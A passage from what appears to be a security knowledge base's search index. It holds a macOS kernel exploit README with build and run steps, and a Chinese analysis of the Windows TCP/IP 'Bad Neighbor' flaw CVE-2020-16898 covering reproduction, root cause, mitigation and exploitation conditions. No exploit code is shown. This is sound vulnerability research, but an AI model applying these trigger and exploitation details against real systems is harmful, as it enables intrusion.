pretty much unusable for in-the-wild exploitation but still helpful for security researchers in a controlled lab environment. This exploit is intended for security research purposes only.","title":"DISCLAIMER"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#general","text":"macOS Kernel Exploit for CVE-????-???? (currently a 0day. I'll add the CVE# once it is published ;) ). Thanks to @LinusHenze for this cool bug and his support ;P.","title":"General"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#writeup","text":"Probably coming soon. If you want to try and exploit it yourself, here are a few things to get you started: VM: Download the macOS installer from the appstore and drag the .app file into VMWare's NEW VM window Kernel Debugging setup: http://ddeville.me/2015/08/using-the-vmware-fusion-gdb-stub-for-kernel-debugging-with-lldb Have a look at the _kernel_trap function","title":"Writeup"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#build","text":"I recommend setting the bootargs to: debug=0x44 kcsuffix=development -v Note : SMAP needs to be disabled on macs after 2015 ( -pmap_smap_disable ) You will need XCODE <= 9.4.1 to build the exploit. (It needs to be 32bit) Downloading Xcode 9.4.1 Commandline Tools should be enough ;) Download: https://developer.apple.com/download/more/ make","title":"Build"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#execution","text":"./exploit <KASLR slide> Tested on macOS Mojave: Darwin Kernel-Mac.local 18.7.0 Darwin Kernel Version 18.7.0: Thu Jun 20 18:42:21 PDT 2019; root:xnu-4903.270.47~4/DEVELOPMENT_X86_64 x86_64 Demo :","title":"Execution"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2020-16898%20Bad%20Neighbor%20%20Windows%20TCPIP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","text":"CVE-2020-16898 \"Bad Neighbor \" Windows TCP/IP\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790 \u00b6 \u8be5\u6f0f\u6d1e\u4e3b\u8981\u662f\u7531\u4e8eWindows TCP/IP\u5806\u6808\u5728\u5904\u7406\u9009\u9879\u7c7b\u578b\u4e3a25(0x19\uff0c\u9012\u5f52DNS\u670d\u52a1\u5668\u9009\u9879)\u4e14\u957f\u5ea6\u5b57\u6bb5\u503c\u4e3a\u5076\u6570\u7684ICMPv6\u7684\u8def\u7531\u5e7f\u64ad\u6570\u636e\u5305\u65f6\uff0c\u5904\u7406\u903b\u8f91\u5b58\u5728\u7eb0\u6f0f\uff0c\u5bfc\u81f4\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u76ee\u6807\u673a\u5668\uff08\u4e3b\u673a\u6216\u670d\u52a1\u5668\uff09\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u4e00\u3001\u6f0f\u6d1e\u4fe1\u606f 1. \u6f0f\u6d1e\u7b80\u8ff0 \u6f0f\u6d1e\u540d\u79f0\uff1aWindows TCP/IP Remote Code Execution Vulnerability \u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-16898 \u6f0f\u6d1e\u7c7b\u578b\uff1aDesign Weakness \u6f0f\u6d1e\u5f71\u54cd\uff1aCode Execution CVSS\u8bc4\u5206\uff1a9.8 \u5229\u7528\u96be\u5ea6\uff1aMedium \u57fa\u7840\u6743\u9650\uff1a\u4e0d\u9700\u8981 2. \u7ec4\u4ef6\u6982\u8ff0 TCP/IP\u662fInternet\u4e0a\u4f7f\u7528\u7684\u901a\u4fe1\u534f\u8bae\u3002 \u5728Windows\u7684\u65e9\u671f\u7248\u672c\u4e2d\uff0cTCP/IP\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u53ef\u9009\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u50cf\u5176\u4ed6\u4efb\u4f55\u534f\u8bae\u4e00\u6837\u5220\u9664\u6216\u6dfb\u52a0\u3002\u4eceWindows XP/Server 2003\u5f00\u59cb\uff0cTCP/IP\u6210\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u6838\u5fc3\u7ec4\u4ef6\uff0c\u65e0\u6cd5\u5220\u9664\u3002 \u5c06TCP/IP\u4f5c\u4e3aWindows\u7684\u6838\u5fc3\u7ec4\u4ef6\u662f\u975e\u5e38\u6709\u610f\u4e49\u7684\uff0c\u56e0\u4e3a\u5b83\u7684\u529f\u80fd\u5728Microsoft Windows Server\u4e0a\u5bf9\u7f51\u7edc\u64cd\u4f5c\u548cActive Directory\u57df\u73af\u5883\u5c24\u4e3a\u91cd\u8981\u3002 \u6574\u4e2aActive Directory\u67b6\u6784\u57fa\u4e8eDNS\u5c42\u6b21\u7ed3\u6784\uff0c\u4f9d\u8d56\u4e8eTCP/IP \u4f20\u8f93\u534f\u8bae \u3002 Microsoft Windows\u4e2d\u7684TCP/IP\u529f\u80fd\u5728\u5185\u6838\u7ea7\u522b\u8fd0\u884c\uff0c\u5e76\u7531\u9a71\u52a8\u7a0b\u5e8ftcpip.sys\u63d0\u4f9b\u3002\u8be5\u9a71\u52a8\u7a0b\u5e8f\u5904\u7406\u6240\u6709\u4f20\u5165\u548c\u4f20\u51fa\u7684TCP/IP\u901a\u4fe1\u4fe1\u606f\uff0c\u5305\u62ec\u89e3\u6790\u4ece\u7f51\u7edc\u63a5\u53e3\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\uff0c\u4ee5\u53ca\u89e3\u91ca\u6b64\u6570\u636e\u5e76\u5c06\u5176\u4f20\u9012\u7ed9\u66f4\u9ad8\u7ea7\u522b\u7684\u7ec4\u4ef6\u3002 3. \u6f0f\u6d1e\u5229\u7528 \u8be5\u6f0f\u6d1e\u4e3b\u8981\u662f\u7531\u4e8eWindows TCP/IP\u5806\u6808\u5728\u5904\u7406\u9009\u9879\u7c7b\u578b\u4e3a25(0x19\uff0c\u9012\u5f52DNS\u670d\u52a1\u5668\u9009\u9879)\u4e14\u957f\u5ea6\u5b57\u6bb5\u503c\u4e3a\u5076\u6570\u7684ICMPv6\u7684\u8def\u7531\u5e7f\u64ad\u6570\u636e\u5305\u65f6\uff0c\u5904\u7406\u903b\u8f91\u5b58\u5728\u7eb0\u6f0f\uff0c\u5bfc\u81f4\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u76ee\u6807\u673a\u5668(\u4e3b\u673a\u6216\u670d\u52a1\u5668)\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 4. \u6f0f\u6d1e\u5f71\u54cd Microsoft Windows 10 1709 Microsoft Windows 10 1803 Microsoft Windows 10 1809 Microsoft Windows 10 1903 Microsoft Windows 10 1909 Microsoft Windows 10 2004 Microsoft Windows Server 2019 Microsoft Windows Server, version 1903 Microsoft Windows Server, version 1909 Microsoft Windows Server, version 2004 5. \u89e3\u51b3\u65b9\u6848 \u5b98\u65b9\u89e3\u51b3\u65b9\u6848\uff1a\u5fae\u8f6f\u5b98\u65b9\u9488\u5bf9\u8be5\u6f0f\u6d1e\u5df2\u53d1\u5e03\u5b89\u5168\u66f4\u65b0\u8865\u4e01\uff0c\u8865\u4e01\u5730\u5740\uff1a https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 \u4e34\u65f6\u89e3\u51b3\u65b9\u6848\uff1a \u7ba1\u7406\u5458\u542f\u52a8powershell\u6216cmd\uff0c\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u68c0\u67e5\u6240\u6709\u7f51\u7edcIPv6\u63a5\u53e3\u7684\u5217\u8868\u4ee5\u53ca\u76f8\u5e94\u7684\u7d22\u5f15\u53f7\uff1a netsh int ipv6 sh int \u6837\u4f8b\u8f93\u51fa\u5982\u4e0b\uff1a \u786e\u8ba4\u7f51\u7edc\u63a5\u53e3\u7684RDNSS\u529f\u80fd\u5f00\u542f\u60c5\u51b5\uff1a netsh int ipv6 sh int Idx number \u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5173\u95edRDNSS\u529f\u80fd(\u5c06Idx number\u66ff\u6362\u4e3a\u8981\u5173\u95ed\u7684\u7f51\u7edc\u63a5\u53e3\u7684Idx\u503c)\uff1a netsh int ipv6 set int Idx number rabaseddnsconfig=disable \u6837\u4f8b\u8f93\u51fa\u5982\u4e0b\uff1a \u6b64\u65f6\u518d\u6b21\u786e\u8ba4\u63a5\u53e3\u7684RDNSS\u5f00\u542f\u60c5\u51b5\uff0cRDNSS\u529f\u80fd\u5df2\u88ab\u5173\u95ed\uff1a \u4e8c\u3001\u6f0f\u6d1e\u590d\u73b0 1. \u73af\u5883\u642d\u5efa l \u9776\u673a\uff1aWindows 10 1809 x64 l \u9776\u673a\u64cd\u4f5c\uff1a\u65e0\u9700\u4efb\u4f55\u64cd\u4f5c\uff0c\u53ef\u6b63\u5e38\u4e0e\u653b\u51fb\u673a\u901a\u4fe1\u5373\u53ef 2. \u590d\u73b0\u8fc7\u7a0b \\1. \u901a\u8fc7\u5404\u79cd\u624b\u6bb5\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684IPv6\u5730\u5740\u548cMAC\u5730\u5740(\u5177\u4f53\u65b9\u6cd5\u53ef\u81ea\u884c\u63a2\u7d22\uff0c\u8f83\u4e3a\u7b80\u5355) \\2. \u653b\u51fb\u673apython3\u8fd0\u884cpoc\uff1a \\3. \u9776\u673acrash\uff1a \u4e09\u3001\u6f0f\u6d1e\u5206\u6790 1. \u57fa\u672c\u4fe1\u606f \u6f0f\u6d1e\u6587\u4ef6\uff1atcpip.sys \u6f0f\u6d1e\u51fd\u6570\uff1aIpv6pUpdateRDNSS()\u51fd\u6570 \u6f0f\u6d1e\u5bf9\u8c61\uff1aICMPv6\u8def\u7531\u5e7f\u64ad\u4e2d\u7684option\u7ed3\u6784 2. \u80cc\u666f\u77e5\u8bc6 \u9650\u4e8e\u7bc7\u5e45\u95ee\u9898\uff0c\u6b64\u5904\u4e0d\u5bf9\u7528\u4e8eDNS\u914d\u7f6e\u7684IPv6\u8def\u7531\u5e7f\u64ad\u8fdb\u884c\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u66f4\u8be6\u7ec6\u8d44\u6599\u53ef\u53c2\u8003RFC8106\u3002 1. \u57fa\u672c\u77e5\u8bc6 IPv6 Router Advertisment (RA) options\uff0c\u4e5f\u79f0\u4e3aDNS RA options\uff0c\u5141\u8bb8IPv6\u7684\u8def\u7531\u5668\u5411IPv6\u7684\u4e3b\u673a\u5e7f\u64adDNS Recursive Server Address(DNS\u9012\u5f52\u8def\u7531\u5668\u5730\u5740)\u5217\u8868\u548cDNS Search List(DNS\u641c\u7d22\u5217\u8868)\uff0c\u5176\u4e3b\u8981\u7528\u9014\u4e3a\u5728IPv6\u7684\u4e3b\u673a\u4e0a\u8fdb\u884cDNS\u540d\u79f0\u89e3\u6790\u4ee5\u53ca\u57df\u540e\u7f00\u7684\u5904\u7406\u3002 IPv6 Neighbor Discovery(ND\uff0cIPv6\u90bb\u5c45\u53d1\u73b0)\u548cIPv6 Stateless Address Autoconfiguratioin(SLAAC\uff0cIPv6\u65e0\u72b6\u6001\u5730\u5740\u81ea\u52a8\u914d\u7f6e)\u63d0\u4f9b\u4e86\u4f7f\u7528\u4e00\u4e2a\u6216\u591a\u4e2aIPv6\u5730\u5740\uff0c\u9ed8\u8ba4\u8def\u7531\u5668\u4ee5\u53ca\u4e00\u4e9b\u5176\u4ed6\u53c2\u6570\u914d\u7f6e\u56fa\u5b9a\u8282\u70b9\u6216\u79fb\u52a8\u8282\u70b9\u7684\u65b9\u6cd5\u3002 \u5f53\u6f2b\u6e38\u4e3b\u673a\u6bcf\u6b21\u8fde\u63a5\u5230\u53e6\u4e00\u4e2a\u7f51\u7edc\u65f6\uff0c\u65e0\u6cd5\u8fdb\u884c\u624b\u52a8\u914d\u7f6e\u3002 \u867d\u7136\u53ef\u4ee5\u8fdb\u884c\u9759\u6001\u914d\u7f6e\uff0c\u4f46\u662f\u5728\u8bf8\u5982\u7b14\u8bb0\u672c\u7535\u8111\u4e4b\u7c7b\u7684\u901a\u7528\u4e3b\u673a\u4e0a\u901a\u5e38\u4e0d\u5efa\u8bae\u8fd9\u6837\u64cd\u4f5c\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u4e3b\u673a\u8fd0\u884c\u76f4\u63a5\u8fde\u63a5\u5230\u5168\u5c40DNS\u7684\u81ea\u5df1\u7684\u9012\u5f52\u540d\u79f0\u670d\u52a1\u5668\uff0c\u90a3\u4e48\u672c\u5730\u5b9a\u4e49\u7684\u540d\u79f0\u7a7a\u95f4\u5bf9\u4e3b\u673a\u6765\u8bf4\u5c31\u4e0d\u53ef\u7528\u4e86\u3002 \u8bbf\u95eeDNS\u662f\u51e0\u4e4e\u6240\u6709\u4e3b\u673a\u7684\u57fa\u672c\u8981\u6c42\uff0c\u56e0\u6b64IPv6 SLAAC\u5728\u6ca1\u6709\u4efb\u4f55DNS\u914d\u7f6e\u652f\u6301\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0d\u80fd\u5728\u4efb\u4f55\u5b9e\u9645\u7684\u7f51\u7edc\u73af\u5883\u4e2d\u5355\u72ec\u4f5c\u4e3a\u66ff\u4ee3\u90e8\u7f72\u6a21\u578b\u3002 \u5bf9\u4e8eIPv4\u73af\u5883\u4e2d\u7684DNS\u670d\u52a1\u5668\u6765\u8bf4\uff0c\u8fd9\u4e9b\u95ee\u9898\u90fd\u5f88\u5bb9\u6613\u89e3\u51b3\u3002\u4f46\u662f\u5bf9\u4e8eIPv6\u7684\u7f51\u7edc\u73af\u5883\uff0c\u8fd9\u4e9b\u95ee\u9898\u663e\u5f97\u6bd4\u8f83\u68d8\u624b\u3002\u56e0\u6b64\uff0cRFC8106\u5b9a\u4e49\u4e86\u4e00\u79cd\u57fa\u4e8eDNS RA\u9009\u9879\u7684\u673a\u5236\uff0c\u4ee5\u5141\u8bb8IPv6\u4e3b\u673a\u6267\u884c\u81ea\u52a8DNS\u914d\u7f6e\u3002 \u5728\u901a\u8fc7IPv6 SLAAC\u81ea\u52a8\u914d\u7f6eIPv6\u4e3b\u673a\u5730\u5740\u5e76\u4e14\u6ca1\u6709DHCPv6\u57fa\u7840\u7ed3\u6784\u6216\u4e00\u4e9b\u4e3b\u673a\u6ca1\u6709DHCPv6\u5ba2\u6237\u7aef\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u57fa\u4e8eRA\u7684DNS\u914d\u7f6e\u4f5c\u4e3a\u66ff\u4ee3\u3002 \u4f46\u662f\uff0c\u5bf9\u4e8e\u9700\u8981\u5206\u53d1\u5176\u4ed6\u4fe1\u606f\u7684\u7f51\u7edc\uff0c\u53ef\u80fd\u4ecd\u7136\u4f1a\u4f7f\u7528DHCPv6\u3002 \u5728\u8fd9\u4e9b\u7f51\u7edc\u4e2d\uff0c\u53ef\u80fd\u4e0d\u9700\u8981\u57fa\u4e8eRA\u7684DNS\u914d\u7f6e\u3002 \u57fa\u4e8eRA\u7684DNS\u914d\u7f6e\u5141\u8bb8IPv6\u4e3b\u673a\u83b7\u53d6\u4e3b\u673a\u8fde\u63a5\u5230\u7684\u94fe\u63a5\u7684DNS\u914d\u7f6e(\u5373DNS\u9012\u5f52\u670d\u52a1\u5668\u5730\u5740\u548cDNSSL)\u3002 \u6b64\u5916\uff0c\u4e3b\u673a\u4f1a\u4ece\u63d0\u4f9b\u94fe\u63a5\u914d\u7f6e\u4fe1\u606f\u7684\u540c\u4e00RA\u6d88\u606f\u4e2d\u5b66\u4e60\u6b64DNS\u914d\u7f6e\u3002 2. \u540d\u8bcd\u89e3\u91ca Recursive DNS Server (RDNSS)\uff1a\u9012\u5f52DNS\u670d\u52a1\u5668\uff0c\u63d0\u4f9b\u9012\u5f52DNS\u89e3\u6790\u670d\u52a1\u7684\u670d\u52a1\u5668\uff0c\u7528\u4e8e\u5c06\u57df\u540d\u8f6c\u6362\u4e3aIP\u5730\u5740\u6216\u89e3\u6790\u6210RFC1034\u548cRFC1035\u4e2d\u5b9a\u4e49\u7684PTR\u8bb0\u5f55\u3002 RDNSS Option\uff1a\u4e00\u4e2a\u7528\u4e8e\u5411IPv6\u4e3b\u673a\u4f20\u9001RDNSS\u4fe1\u606f\u7684IPv6\u7684RA option\u3010RFC4861\u3011\u3002 DNS Search List (DNSSL)\uff1aPv6\u4e3b\u673a\u5728\u6267\u884cDNS\u67e5\u8be2\u641c\u7d22\u65f6\u4f7f\u7528\u7684DNS\u540e\u7f00\u57df\u540d\u5217\u8868\uff0c\u7528\u4e8e\u641c\u7d22\u7b80\u77ed\u7684\u4e0d\u5408\u683c\u57df\u540d\u3002 DNSSL Option\uff1a\u4e00\u4e2aIPv6 RA\u9009\u9879\uff0c\u7528\u4e8e\u5c06DNSSL\u4fe1\u606f\u4f20\u9012\u5230IPv6\u4e3b\u673a\u3002 3. \u8be6\u7ec6\u5206\u6790 \\1. \u57fa\u7840\u5206\u6790 RFC8106\u6807\u51c6\u5316\u4e86RDNSS option\uff0c\u5176\u4e2d\u5305\u542bRDNSSes\u7684\u5730\u5740\u3002\u8be5\u4fe1\u606f\u4f7f\u7528\u73b0\u6709ND message(\u4f8b\u5982RA)\u4f5c\u4e3a\u8f7d\u4f53\u3002IPv6\u4e3b\u673a\u53ef\u4ee5\u901a\u8fc7RA\u6d88\u606f\u914d\u7f6e\u4e00\u4e2a\u6216\u591a\u4e2aRDNSS\u7684IPv6\u5730\u5740\u3002 (1) \u90bb\u5c45\u53d1\u73b0\u6269\u5c55 RFC8106\u4e2d\u5b9a\u4e49\u7684\u5728\u90bb\u5c45\u53d1\u73b0\u4e2d\u4f7f\u7528\u7684IPv6 DNS\u914d\u7f6e\u7b97\u6cd5\u9700\u8981\u7528\u52302\u79cdND options\uff1aRDNSS option\u548cDNSSL option\u3002\u4e0e\u8be5\u6f0f\u6d1e\u76f8\u5173\u7684\u662fRDNSS option\uff0c\u53e6\u5916\u4e00\u79cd\u5219\u4e0e CVE-2020-16899\u76f8\u5173\u3002 (2)RDNSS Option Structure RDNSS option\u603b\u4f53\u7ed3\u6784\u5982\u4e0b\uff1a \u5bf9\u4e8eLength\u5b57\u6bb5\uff0c\u5982\u679c\u8be5\u9009\u9879\u4e2d\u4ec5\u5305\u542b\u4e00\u4e2aIPv6\u5730\u5740\uff0c\u5219\u6700\u5c0f\u503c\u4e3a3\u3002 \u6bcf\u589e\u52a0\u4e00\u4e2aRDNSS\u5730\u5740\uff0c\u957f\u5ea6\u5c31\u4f1a\u589e\u52a02\u3002\u63a5\u6536\u7684\u4e3b\u673a\u4f7f\u7528\u8be5\u5b57\u6bb5\u6765\u786e\u5b9a\u9009\u9879\u4e2dIPv6\u5730\u5740\u7684\u6570\u91cf\u3002 (3)Procedure in IPv6 Hosts \u5f53\u4e3b\u673a\u63a5\u6536\u5230RA\u6d88\u606f\u4e2d\u7684DNS\u7684options\u65f6\uff0c\u5176\u5904\u7406\u8fc7\u7a0b\u5982\u4e0b\uff1a \u9996\u5148\u68c0\u67e5Lengh\u5b57\u6bb5\u7684\u5408\u6cd5\u6027\uff1a\u662f\u5426\u5927\u4e8e\u7b49\u4e8e\u6700\u5c0f\u503c3\uff0c\u4ee5\u53ca\u662f\u5426\u6ee1\u8db3(Length - 1) % 2 == 0; \u5bf9\u4e8eRDNSS option\uff0c\u8fd8\u4f1a\u68c0\u67e5Address\u5b57\u6bb5\u662f\u5426\u4e3a\u4e00\u4e2a\u5355\u64ad\u5730\u5740; \u5982\u679c\u4ee5\u4e0a\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5219\u4e3b\u673a\u5e94\u6309\u987a\u5e8f\u5c06\u9009\u9879\u7684\u503c\u590d\u5236\u5230DNS\u5b58\u50a8\u5e93\u548c\u89e3\u6790\u5668\u5b58\u50a8\u5e93\u4e2d\u3002 \u5426\u5219\uff0c\u4e3b\u673a\u5fc5\u987b\u4e22\u5f03\u8fd9\u4e9b\u9009\u9879\u3002 (4)Crash\u5206\u6790 \u9996\u5148\u5206\u6790dmp\u6587\u4ef6\uff0c\u67e5\u770bcrash\u73b0\u573a\uff1a \u5e76\u6ca1\u6709\u53d1\u73b0\u660e\u663e\u7684\u8f83\u4e3a\u6709\u4ef7\u503c\u7684Call Stack\u4fe1\u606f\uff0c\u4f46\u662f\u53d1\u73b0\u6700\u7ec8\u7684crash\u539f\u56e0\u7684\u662fGS\u673a\u5236\u7684Security Cookie\u6821\u9a8c\u5931\u8d25\uff0c\u4e5f\u5c31\u662f\u8bf4\u8be5\u503c\u88ab\u8986\u76d6\u6389\u4e86\u3002\u90a3\u4e48\u5f88\u6709\u53ef\u80fd\u662f\u4e00\u4e2a\u6ea2\u51fa\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u53ea\u53d1\u73b0\u4e86tcpip!Ipv6pHandleRouterAdvertisement+0x1269\u51fd\u6570\uff0c\u518d\u5f80\u540e\u5c31\u76f4\u63a5\u62a5gsfailure\u4e86\u3002 \\2. \u9759\u6001\u5206\u6790 \u5206\u6790\u4f7f\u7528\u7684\u6587\u4ef6\u4e3aWindows 10 1809 x64\u7684tcpip.sys\u6587\u4ef6\uff0c\u7248\u672c\u4e3a10.0.17763.316\u3002 (1)\u51fd\u6570\u8c03\u7528\u94fe \u6839\u636ecrash\u73b0\u573a\u4fe1\u606f\uff0c\u83b7\u53d6\u5230\u5173\u952e\u51fd\u6570tcpip!Ipv6pHandleRouterAdvertisement()\uff0c\u9996\u5148\u786e\u8ba4\u8be5\u51fd\u6570\u5230\u6f0f\u6d1e\u51fd\u6570\u7684\u524d\u540e\u8c03\u7528\u94fe\u3002 \u9996\u5148\u67e5\u770b\u5176\u4ea4\u53c9\u5f15\u7528\u5173\u7cfb\uff1a \u5176\u4e0a\u5c42\u8c03\u7528\u51fd\u6570\u4e3aIcmpv6ReceiveDatagrams()\uff0c\u8ddf\u8fdb\uff0c\u5e76\u67e5\u770b\u4ea4\u53c9\u5f15\u7528\u5173\u7cfb\uff1a \u6ca1\u6709\u518d\u53d1\u73b0\u663e\u5f0f\u7684\u51fd\u6570\u8c03\u7528\u3002\u8f6c\u800c\u5411tcpip!Ipv6pHandleRouterAdvertisement()\u7684\u4e0b\u5c42\u641c\u7d22\uff1a \u53d1\u73b0\u6f0f\u6d1e\u51fd\u6570\u8c03\u7528\u3002\u81f3\u6b64\uff0c\u51fd\u6570\u8c03\u7528\u94fe\u53ef\u4ee5\u7b80\u5355\u6982\u62ec\u4e3a\uff1a Icmpv6ReceiveDatagrams() -> tcpip!Ipv6pHandleRouterAdvertisement() -> Ipv6pUpdateRDNSS() (2)\u6f0f\u6d1e\u51fd\u6570\u5206\u6790 \u7ecf\u8fc7\u7b80\u5355\u5206\u6790\u53ef\u4ee5\u660e\u786e\uff0c\u8c03\u7528\u94fe\u7684\u9876\u5c42\u51fd\u6570Icmpv6ReceiveDatagrams()\u6ca1\u6709\u53d1\u73b0\u5b9e\u8d28\u6027\u7684\u4e0e\u8be5\u6f0f\u6d1e\u76f8\u5173\u7684\u5904\u7406\u4ee3\u7801\uff0c\u800c\u5728tcpip!Ipv6pHandleRouterAdvertisement() \u51fd\u6570\u4e2d\u53d1\u73b0\u4e86\u5bf9\u6f0f\u6d1e\u51fd\u6570Ipv6pUpdateRDNSS()\u7684\u8c03\u7528\u3002\u6839\u636ecrash\u5206\u6790\uff0c\u6700\u540e\u62a5\u4e86gsfailure\uff0c\u800c\u4e14\u5173\u952e\u51fd\u6570\u4e3atcpip!Ipv6pHandleRouterAdvertisement()\uff0c\u5728\u8be5\u51fd\u6570\u7684\u8d77\u59cb\u4f4d\u7f6e\u786e\u5b9e\u53d1\u73b0\u4e86GS\u6821\u9a8c\uff1a \u90a3\u4e48\u5f88\u6709\u53ef\u80fd\u662f\u5728\u6f0f\u6d1e\u51fd\u6570Ipv6pUpdateRDNSS()\u4e2d\u53d1\u751f\u4e86\u6ea2\u51fa\uff0c\u5bfc\u81f4\u4e86\u5176\u8c03\u7528\u51fd\u6570tcpip!Ipv6pHandleRouterAdvertisement()\u7684GS\u6821\u9a8c\u5931\u8d25\u3002 \u8fdb\u5165\u6f0f\u6d1e\u51fd\u6570Ipv6pUpdateRDNSS()\uff1a \u9996\u5148\u83b7\u53d6\u5230RDNSS option\u7ed3\u6784\uff0c\u7136\u540e\u8bfb\u53d6Length\u5b57\u6bb5\u6765\u8ba1\u7b97Address\u5b57\u6bb5\u6709\u51e0\u4e2aAddress\u503c\u3002 \u786e\u8ba4\u6709\u591a\u5c11Address\u4e4b\u540e\uff0c\u8fdb\u5165\u5faa\u73af\uff0c\u5bf9\u6bcf\u4e2aAddress\u8fdb\u884c\u5904\u7406\uff0c\u6700\u5173\u952e\u7684\u662f\u5206\u914d\u5408\u9002\u7684\u5185\u5b58\u3002\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u5224\u65ad\uff0c\u5982\u679c\u4e0d\u662f\u5355\u64ad\u5730\u5740\uff0c\u76f4\u63a5\u5ffd\u7565\u3002 \u5728\u8fdb\u884c\u5904\u7406\u65f6\uff0c\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff1a\u5047\u8bbeLength\u7684\u957f\u5ea6\u4e3a4\uff0c\u90a3\u4e48\u8ba1\u7b97\u7ed3\u675f\u4e4b\u540e\uff0cAddressCount\u7684\u503c\u5e94\u8be5\u4e3a1\u3002\u6b64\u65f6\uff0c\u6309\u7167\u6b63\u5e38\u903b\u8f91\uff0cIpv6pUpdateRDNSS()\u51fd\u6570\u5e94\u8be5\u589e\u52a032\u5b57\u8282(4*8)\u7684\u7f13\u51b2\u533a\uff0c\u4f46\u662f\u540e\u7eed\u5728\u5206\u914d\u7f13\u51b2\u533a\u65f6\u53ea\u5206\u914d\u4e8624\u5b57\u8282\uff1asizeof(ND_OPTION_RDNSS) + sizeof(IN6_ADDR) = 8 + 16 = 24\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u7f13\u51b2\u533a\u7684\u6ea2\u51fa\u3002 \u6839\u636eRFC8106\u7684\u6807\u51c6\uff0cLength\u5b57\u6bb5\u7684\u503c\u5e94\u8be5\u6ee1\u8db3\u6700\u5c0f\u4e3a3\u7684\u5947\u6570\u7684\u60c5\u51b5\u3002\u5f53\u63d0\u4f9b\u4e00\u4e2a\u5076\u6570Length\u503c\u65f6\uff0cWindows TCP/IP\u5806\u6808\u9519\u8bef\u5730\u5c06buffer\u524d\u8fdb\u4e868\u4e2a\u5b57\u8282\u3002\u8fd9\u4e3b\u8981\u662f\u56e0\u4e3a\u5806\u6808\u5728\u5185\u90e8\u4ee516\u5b57\u8282\u4e3a\u589e\u91cf\u8fdb\u884c\u8ba1\u6570\uff0c\u5e76\u4e14\u6ca1\u6709\u4f7f\u7528\u975eRFC\u517c\u5bb9\u957f\u5ea6\u503c\u7684\u5904\u7406\u4ee3\u7801\u3002\u8fd9\u79cd\u4e0d\u5339\u914d\u5bfc\u81f4\u5806\u6808\u5c06\u5f53\u524d\u9009\u9879\u7684\u6700\u540e8\u4e2a\u5b57\u8282\u89e3\u91ca\u4e3a\u7b2c\u4e8c\u4e2a\u9009\u9879\u7684\u5f00\u59cb\uff0c\u6700\u7ec8\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u6f5c\u5728\u7684RCE\u3002 4. \u5229\u7528\u601d\u8def \\1. \u5229\u7528\u6761\u4ef6 \u57fa\u672c\u6761\u4ef6 attacker\u9700\u8981\u83b7\u53d6target\u7684IPv6\u548cMAC\u5730\u5740 \u89e6\u53d1\u8fc7\u7a0b attacker\u9700\u8981\u642d\u914d\u5176\u4ed6\u5185\u5b58\u6cc4\u6f0f\u6216\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u6765\u5b9e\u73b0RCE attacker\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7tcpip.sys\u7684GS\u4fdd\u62a4\u673a\u5236 \\2. \u5229\u7528\u8fc7\u7a0b attacker\u76f4\u63a5\u53d1\u9001\u7279\u5236\u7684ICMPv6\u8def\u7531\u5e7f\u64ad\u6570\u636e\u5305\u7ed9target\uff1a [ Attacker ] \\3. \u653b\u51fb\u5411\u91cf \u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u5229\u7528IPv6\u76f4\u63a5\u53d1\u9001\u653b\u51fb\u6570\u636e\u5305\u5373\u53ef\u3002 5. \u6d41\u91cf\u5206\u6790 \u56e0\u4e3a\u8be5\u6f0f\u6d1e\u76f4\u63a5\u8d70\u7684IPv6\uff0c\u6240\u4ee5\u5bf9\u4e8e\u4e00\u4e9b\u90e8\u7f72\u5728IP\u5c42\u4ee5\u4e0a\u7684\u9632\u706b\u5899\u65b9\u6848\u5c31\u65e0\u6cd5\u9488\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u6d41\u91cf\u68c0\u6d4b\uff0c\u4f46\u662f\u5177\u5907IP\u5c42\u6d41\u91cf\u68c0\u6d4b\u7684\u9632\u706b\u5899\u53ef\u4ee5\u8f7b\u677e\u68c0\u6d4b\u6076\u610f\u6d41\u91cf\uff1a 